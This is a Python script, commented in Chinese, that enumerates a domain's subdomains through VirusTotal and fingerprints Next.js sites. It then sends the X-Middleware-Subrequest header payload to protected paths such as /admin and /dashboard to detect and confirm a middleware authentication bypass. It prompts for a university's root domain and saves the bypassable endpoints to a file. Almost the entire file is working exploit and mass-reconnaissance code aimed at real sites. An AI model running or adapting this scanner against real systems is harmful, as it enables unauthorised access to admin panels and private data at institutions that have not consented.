import requests
import json
from urllib.parse import urljoin, urlparse
import re
import time
import sys

# --- 配置 ---
# 请将 YOUR_VIRUSTOTAL_API_KEY 替换为你自己的 Virustotal API 密钥
VIRUSTOTAL_API_KEY = "用你自己的"
# 每次API请求之间的延迟（秒），避免触发API速率限制
VIRUSTOTAL_API_DELAY = 3
# 每次检查URL之间的延迟（秒），避免对目标服务器造成过大压力
CHECK_URL_DELAY = 0.5
# 扫描一个子域名完成后的延迟（秒）
SUBDOMAIN_SCAN_DELAY = 1
# 用于判断鉴权绕过成功的X-Middleware-Subrequest值
X_MIDDLEWARE_SUBREQUEST_PAYLOAD = "middleware:middleware:middleware:middleware:middleware"
# 鉴权拒绝时，200 OK响应体中常见的关键词（小写）
AUTH_DENIED_KEYWORDS = [
    'login form', 'sign in', 'please log in', 'unauthorized access',
    'permission denied', '用户登录', '需要登录', '请先登录',
    '认证失败', '授权失败', 'access denied', 'forbidden'
]
# 成功绕过后的响应体中，可能出现的敏感关键词（示例，可根据实际目标调整）
SUCCESS_KEYWORDS = [
    'dashboard', 'admin panel', 'user list', 'settings', 'user profile',
    '后台管理', '控制台', '用户列表', '编辑资料', '配置文件'
]
# 最小内容长度增益比例，判断内容是否显著增加
MIN_CONTENT_LENGTH_GAIN = 1.5

# --- 辅助函数 ---

def get_subdomains_from_virustotal(domain):
    """
    通过Virustotal API获取指定域名的所有子域名（处理分页）。
    """
    if not VIRUSTOTAL_API_KEY or VIRUSTOTAL_API_KEY == "YOUR_VIRUSTOTAL_API_KEY":
        print("[-] 错误: 请在代码中配置您的Virustotal API密钥。")
        return []

    initial_url = f"https://www.virustotal.com/api/v3/domains/{domain}/subdomains"
    headers = {
        "x-apikey": VIRUSTOTAL_API_KEY,
        "Accept": "application/json"
    }
    all_subdomains = set()
    current_url = initial_url
    page_count = 0

    print(f"[*] 正在请求 Virustotal API 获取 {domain} 的所有子域名...")

    while True:
        page_count += 1
        print(f"    -> 正在获取第 {page_count} 页子域名 (当前已收集: {len(all_subdomains)})...")

        try:
            response = requests.get(current_url, headers=headers, timeout=20)
            response.raise_for_status()

            data = response.json()

            if 'data' not in data:
                # print(f"[-] Virustotal API响应中未找到 'data' 字段，可能没有更多子域名或API响应格式异常。响应内容: {data}")
                break # 没有更多数据则退出

            for entry in data['data']:
                all_subdomains.add(entry['id'])

            next_link = data.get('links', {}).get('next')
            if not next_link:
                break

            current_url = next_link 

            print(f"    [+] 成功获取到 {len(data['data'])} 个子域名，准备获取下一页...")
            time.sleep(VIRUSTOTAL_API_DELAY)

        except requests.exceptions.RequestException as e:
            print(f"[-] Virustotal API请求失败: {e}")
            if hasattr(response, 'status_code'):
                if response.status_code == 403:
                    print("    提示: 可能是API密钥无效或请求频率过高。")
                elif response.status_code == 429:
                    print("    提示: 请求频率过高，请稍后再试。请等待并重试。")
                    time.sleep(VIRUSTOTAL_API_DELAY * 2) 
                    continue 
            break 
        except json.JSONDecodeError:
            print("[-] 无法解析Virustotal API响应，可能是API返回了非JSON内容。")
            break

    print(f"[+] 成功从 Virustotal 获取到总计 {len(all_subdomains)} 个子域名。")
    return list(all_subdomains)

def is_nextjs_service(url):
    """
    判断一个URL是否运行Next.js服务。
    """
    try:
        response = requests.get(url, timeout=3, allow_redirects=True)
        response.raise_for_status()

        if 'X-Powered-By' in response.headers and 'Next.js' in response.headers['X-Powered-By']:
            return True
        
        response_text_sample = response.text[:10000] 
        if '<div id="__next">' in response_text_sample or 'src="/_next/static/' in response_text_sample:
            return True
        
        for cookie in response.cookies:
            if cookie.name == '__Host-next-auth.csrf-token' or cookie.name == 'next-auth.csrf-token':
                return True

        return False
    except requests.exceptions.RequestException:
        return False

def collect_paths_from_static_resources(base_url):
    """
    从HTML和JS中收集潜在路径。
    """
    potential_paths = set()
    print(f"[*] 正在从 {base_url} 收集潜在路径...")
    try:
        response = requests.get(base_url, timeout=10)
        response.raise_for_status()

        href_src_matches = re.findall(r'(?:href|src)=["\']([^"\']+?)["\']', response.text)
        for match in href_src_matches:
            if match.startswith('/') and not match.startswith('//'):
                if not match.startswith('/_next/') and not match.startswith('/static/'):
                    potential_paths.add(match)
            elif urlparse(match).netloc == urlparse(base_url).netloc:
                parsed_path = urlparse(match).path
                if parsed_path and not parsed_path.startswith('/_next/') and not parsed_path.startswith('/static/'):
                    potential_paths.add(parsed_path)

        js_urls = re.findall(r'src=["\']([^"\']+\.js)["\']', response.text)
        for js_url_relative in js_urls:
            full_js_url = urljoin(base_url, js_url_relative)
            try:
                js_response = requests.get(full_js_url, timeout=5)
                js_response.raise_for_status()
                js_paths = re.findall(r'["\'](/[\w\d\-\_/]{2,100})["\']', js_response.text)
                for p in js_paths:
                    if not p.startswith('/_next/') and not p.startswith('/static/'):
                        potential_paths.add(p)
            except requests.exceptions.RequestException:
                pass

    except requests.exceptions.RequestException as e:
        print(f"[-] 收集 {base_url} 潜在路径失败: {e}")
        pass

    common_nextjs_paths = [
        "/admin", "/dashboard", "/settings", "/profile", "/api/user", "/api/data",
        "/api/admin", "/admin/dashboard", "/admin/users", "/admin/config", "/admin/edit",
        "/user/profile", "/user/edit", "/api/me", "/api/auth/me", "/api/graphql",
        "/private", "/protected", "/internal", "/panel"
    ]
    for p in common_nextjs_paths:
        potential_paths.add(p)

    return list(potential_paths)

def get_response_details(url, headers=None, allow_redirects=False):
    """
    获取URL的响应详细信息，包括状态码、内容和最终URL（如果发生重定向）。
    """
    try:
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=allow_redirects)
        final_url = response.url # 获取最终重定向的URL
        return response.status_code, response.text, final_url, response.headers
    except requests.exceptions.RequestException:
        return -1, "", url, {} # -1 表示请求失败

def run_reconnaissance_module():
    """
    运行探测模块的主函数。
    """
    target_domain = input("请输入大学的根域名 (e.g., ccnu.edu.cn): ").strip()
    if not target_domain:
        print("[-] 域名不能为空。")
        return {}

    print(f"[+] 正在收集 {target_domain} 的子域名...")

    subdomains = get_subdomains_from_virustotal(target_domain)
    if not subdomains:
        print("[-] 未找到任何子域名或Virustotal API请求失败，无法继续。")
        return {}

    print(f"[+] 找到了 {len(subdomains)} 个子域名。开始检测Next.js服务和鉴权绕过可能性...")

    vulnerable_nextjs_targets = []  # 存储最终发现的可能易受攻击的目标

    for i, subdomain in enumerate(subdomains):
        print(f"\n[*] 正在检测子域名 [{i+1}/{len(subdomains)}]: {subdomain}")
        
        urls_to_check = [f"https://{subdomain}", f"http://{subdomain}"]
        
        potential_nextjs_root_url = None

        for url in urls_to_check:
            sys.stdout.write(f"\r    -> 检查根URL {url} 的Next.js服务...")
            sys.stdout.flush()
            if is_nextjs_service(url):
                print(f"\n[+] 在根URL {url} 上检测到Next.js服务。")
                potential_nextjs_root_url = url
                break 
            time.sleep(CHECK_URL_DELAY) 
        
        if potential_nextjs_root_url:
            potential_paths = collect_paths_from_static_resources(potential_nextjs_root_url)
            
            if potential_paths:
                print(f"[*] 对 {len(potential_paths)} 条潜在路径进行Next.js服务识别和鉴权绕过尝试...")

                for j, path in enumerate(potential_paths):
                    full_path_url = urljoin(potential_nextjs_root_url, path)
                    
                    sys.stdout.write(f"\r      -> 路径 [{j+1}/{len(potential_paths)}]: 检查 {full_path_url} ...")
                    sys.stdout.flush()

                    # 1. 确认路径是否运行Next.js
                    if not is_nextjs_service(full_path_url):
                        time.sleep(CHECK_URL_DELAY)
                        continue 

                    # 2. 获取原始未授权响应 (不带任何鉴权头)
                    original_status, original_content, original_final_url, original_headers = get_response_details(full_path_url, allow_redirects=False)

                    is_protected = False
                    protection_reason = "未知或公开"

                    if original_status == 401:
                        is_protected = True
                        protection_reason = "401 Unauthorized"
                    elif original_status == 403:
                        is_protected = True
                        protection_reason = "403 Forbidden"
                    elif 300 <= original_status < 400:
                        location_header = original_headers.get('Location', '').lower()
                        # 检查重定向目标是否是常见的登录或错误页
                        if any(kw in location_header for kw in ['/login', '/signin', '/auth', '/error']):
                            is_protected = True
                            protection_reason = f"重定向到登录/错误页 ({original_status})"
                    elif original_status == 200:
                        original_content_lower = original_content.lower()
                        # 检查响应体内容是否暗示需要登录
                        if any(keyword in original_content_lower for keyword in AUTH_DENIED_KEYWORDS):
                            is_protected = True
                            protection_reason = "200 OK (内容提示需登录)"
                    
                    if not is_protected:
                        time.sleep(CHECK_URL_DELAY)
                        continue

                    sys.stdout.write(f"\r      [+] 路径 {full_path_url} 运行Next.js服务且受保护 ({protection_reason})。尝试鉴权绕过...\n")
                    sys.stdout.flush()
                    
                    # 3. 尝试鉴权绕过 (带 X-Middleware-Subrequest 标头)
                    bypass_headers = {
                        "Host": urlparse(potential_nextjs_root_url).netloc,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "X-Middleware-Subrequest": X_MIDDLEWARE_SUBREQUEST_PAYLOAD,
                        "Connection": "close"
                    }
                    bypass_status, bypass_content, bypass_final_url, bypass_headers_full = get_response_details(full_path_url, headers=bypass_headers, allow_redirects=False)

                    # 4. 判断是否成功绕过
                    bypass_succeeded = False
                    success_reason = ""

                    # 情况1: 原始是鉴权拒绝，绕过变为 200 OK
                    if (original_status in [401, 403] or (300 <= original_status < 400 and is_protected)) and bypass_status == 200:
                        # 进一步检查内容，确保不是空白或简单的错误
                        if len(bypass_content) > 100: # 绕过成功内容通常不会太短
                            # 确保绕过后的内容不再是鉴权拒绝关键词
                            if not any(keyword in bypass_content.lower() for keyword in AUTH_DENIED_KEYWORDS):
                                bypass_succeeded = True
                                success_reason = f"状态码从 {original_status} 变为 {bypass_status}，内容非登录页"
                        elif len(bypass_content) == 0 and original_status != 200: # 原始有重定向或错误，现在空200（可能是后端无数据）
                             bypass_succeeded = True # 视为部分绕过
                             success_reason = f"状态码从 {original_status} 变为 {bypass_status}，内容为空（可能后端无数据）"

                    # 情况2: 原始是 200 OK 但内容是登录页，绕过变为 200 OK 且内容变化
                    elif original_status == 200 and is_protected and bypass_status == 200:
                        original_content_len = len(original_content)
                        bypass_content_len = len(bypass_content)

                        # 检查内容长度是否显著增加 (可能获取了实际内容)
                        if original_content_len > 0 and bypass_content_len > original_content_len * MIN_CONTENT_LENGTH_GAIN:
                            # 并且确保绕过后的内容不再是鉴权拒绝关键词
                            if not any(keyword in bypass_content.lower() for keyword in AUTH_DENIED_KEYWORDS):
                                bypass_succeeded = True
                                success_reason = "内容长度显著增加"
                        # 或者内容虽然没显著增加，但不再包含登录/鉴权关键词
                        elif not any(keyword in bypass_content.lower() for keyword in AUTH_DENIED_KEYWORDS) and any(keyword in bypass_content.lower() for keyword in SUCCESS_KEYWORDS):
                            bypass_succeeded = True
                            success_reason = "内容关键词变化（不再是鉴权页）"
                        elif original_content_len == 0 and bypass_content_len > 0: # 原始空，绕过有内容
                            if not any(keyword in bypass_content.lower() for keyword in AUTH_DENIED_KEYWORDS):
                                bypass_succeeded = True
                                success_reason = "原始空响应，绕过获取到内容"
                        elif original_content_len == 0 and bypass_content_len == 0: # 原始空，绕过也空
                            # 这种情况下，如果原始是重定向或401/403，现在还是空，很难判断是否成功。
                            # 暂时不标记为成功，避免误报。需要人工验证。
                            pass

                    if bypass_succeeded:
                        sys.stdout.write(f"\r      [!!!] **可能存在鉴权绕过漏洞！** 路径: {full_path_url}\n")
                        sys.stdout.write(f"            原始状态: {original_status} ({protection_reason}), 绕过状态: {bypass_status}\n")
                        sys.stdout.write(f"            判定理由: {success_reason}\n")
                        sys.stdout.flush()
                        vulnerable_nextjs_targets.append({
                            "url": potential_nextjs_root_url,
                            "path": path,
                            "full_path_url": full_path_url,
                            "original_status": original_status,
                            "original_protection_reason": protection_reason,
                            "bypass_status": bypass_status,
                            "bypass_payload": X_MIDDLEWARE_SUBREQUEST_PAYLOAD,
                            "bypass_success_reason": success_reason
                        })
                    else:
                        sys.stdout.write(f"\r      [-] 未能绕过路径: {full_path_url} (原始: {original_status}, 绕过: {bypass_status})\n")
                        sys.stdout.flush()

                    time.sleep(CHECK_URL_DELAY)
                
                if not vulnerable_nextjs_targets:
                    print(f"\n[-] 未在 {potential_nextjs_root_url} 上发现易受攻击的Next.js路径。")
            else:
                print(f"\n[-] 未在 {potential_nextjs_root_url} 上发现任何潜在路径。")
        else:
            sys.stdout.write(f"\r    -> {subdomain} 的根URL未发现Next.js服务。\n")
            sys.stdout.flush()

        time.sleep(SUBDOMAIN_SCAN_DELAY)

    if vulnerable_nextjs_targets:
        print("\n--- 探测结果：可能易受攻击的Next.js鉴权绕过目标 ---")
        try:
            with open("nextjs_vulnerable_targets.json", "w", encoding='utf-8') as f:
                json.dump(vulnerable_nextjs_targets, f, indent=4, ensure_ascii=False)
            print("\n[+] 探测结果已保存到 nextjs_vulnerable_targets.json。")
        except IOError as e:
            print(f"[-] 无法保存探测结果到文件: {e}")
        
        # 打印到控制台
        for target in vulnerable_nextjs_targets:
            print(f"\n[!!!] 漏洞目标: {target['full_path_url']}")
            print(f"      原始保护: {target['original_status']} ({target['original_protection_reason']})")
            print(f"      绕过尝试: {target['bypass_status']} ({target['bypass_success_reason']})")
            print(f"      利用 Payload: X-Middleware-Subrequest: {target['bypass_payload']}")
            print("-" * 50)
    else:
        print("\n[-] 未发现任何可能易受攻击的Next.js鉴权绕过目标。")

    return vulnerable_nextjs_targets

if __name__ == "__main__":
    print("--- Next.js 中间件鉴权绕过漏洞探测模块 (bugu V2.0 - 高精度版) ---")
    print("请确保已安装 `requests` 库 (pip install requests)")
    print("请在代码中配置您的Virustotal API密钥！")
    print("注意: 绕过判断依赖于响应内容，可能需要根据目标调整关键词。")
    run_reconnaissance_module()

